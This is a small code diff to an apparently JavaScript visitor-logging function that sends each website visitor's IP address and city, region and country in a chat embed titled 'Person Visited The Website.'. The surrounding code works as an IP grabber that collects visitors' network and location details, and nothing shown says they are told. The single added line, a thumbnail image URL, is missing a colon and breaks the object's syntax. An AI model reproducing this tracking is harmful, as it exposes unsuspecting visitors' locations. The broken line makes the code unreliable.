@@ -66,6 +66,7 @@ async function logVisitorDetails() {
       embeds: [{
         title: "Person Visited The Website.",
         color: 0x2f3136,
+        thumbnail "https://media.discordapp.net/attachments/1415852487147131001/1415853135582203955/core.png?ex=68c4b77c&is=68c365fc&hm=96f9c60459d6e21b466ec7ea177902fb576aa461e20385dcb3b20495151a8dcd&=&format=webp&quality=lossless", // Full image
         fields: [
           { name: "IP Address", value: geoData.ip || "Unknown", inline: true },
           { name: "Location", value: `${geoData.city || "Unknown City"}, ${geoData.region || "Unknown Region"}, ${geoData.country || "Unknown Country"}`, inline: true },
